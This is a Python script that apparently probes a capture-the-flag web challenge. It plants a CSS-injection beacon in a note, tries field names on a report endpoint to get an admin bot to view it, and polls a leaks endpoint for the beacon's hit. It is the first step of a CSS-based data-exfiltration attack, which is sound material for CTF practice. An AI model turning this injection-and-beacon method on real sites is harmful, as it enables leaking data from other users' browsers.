#!/usr/bin/env python3
# Diagnostic for "Approve Please, Genie!"
# Q1: Does the bot actually load the note despite the '{"error":"admin bot failed to load"}' reply?
#     -> post a note that fires /collect UNCONDITIONALLY, report it, IGNORE the error, wait, poll /leaks.
# Q2: Does /report accept a different field name?
# Usage: python diagnose.py 144.79.188.39:38282
import requests, sys, time, json

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:38282"
if BASE.startswith("http"):
    _, __, BASE = BASE.partition("://")
ROOT = f"http://{BASE}"
S = requests.Session()

def make_note(content):
    return S.post(f"{ROOT}/note", data={"content": content}, timeout=30).json()

def leaks(tok):
    try:
        return S.get(f"{ROOT}/leaks/{tok}", timeout=30).json()
    except Exception as e:
        return f"err {e}"

# --- Q1: unconditional beacon ---
seed = make_note("<div>seed</div>")
tok = seed["leakToken"]
print("[*] token", tok)
beacon = f'<style>#note-content{{display:block;width:80px;height:80px;background:url(/collect?t={tok}&q=BOTALIVE)}}</style>'
note = make_note(beacon)
nid = note["id"]
print("[*] beacon note", nid, "viewUrl", note.get("viewUrl"))

# try several /report field names, record every response
for field in ("id", "url", "noteId", "note", "target", "viewUrl"):
    val = note.get("viewUrl") if field in ("url", "viewUrl") else nid
    try:
        r = S.post(f"{ROOT}/report", data={field: val}, timeout=120)
        print(f"[report {field}={val}] {r.status_code} {r.text[:160]}")
    except Exception as e:
        print(f"[report {field}] err {e}")
    time.sleep(3)

# --- now wait and poll /leaks: did BOTALIVE ever fire (bot loaded despite error)? ---
print("[*] polling /leaks up to 90s for BOTALIVE ...")
for i in range(30):
    time.sleep(3)
    data = leaks(tok)
    hit = [h for h in (data if isinstance(data, list) else []) if str(h.get("query", {}).get("q")) == "BOTALIVE"]
    if hit:
        print("[+++] BOT LOADED THE NOTE! /collect fired -> exfil works, error msg is a red herring.")
        print(json.dumps(hit[0], indent=0))
        break
else:
    print("[-] BOTALIVE never fired in 90s -> bot genuinely does not load notes; need the real /report contract.")
    print("    Last /leaks:", leaks(tok))

# --- Q2: also sanity-check my own request fires /collect (proves selector-less beacon syntax is ok) ---
print("[*] self-fetch beacon page to confirm CSS beacon syntax works:")
try:
    page = S.get(f"{ROOT}{note.get('viewUrl')}", timeout=15).text
    print("    note page has flag-holder:", "flag-holder" in page, "| has our style:", "BOTALIVE" in page)
except Exception as e:
    print("    err", e)
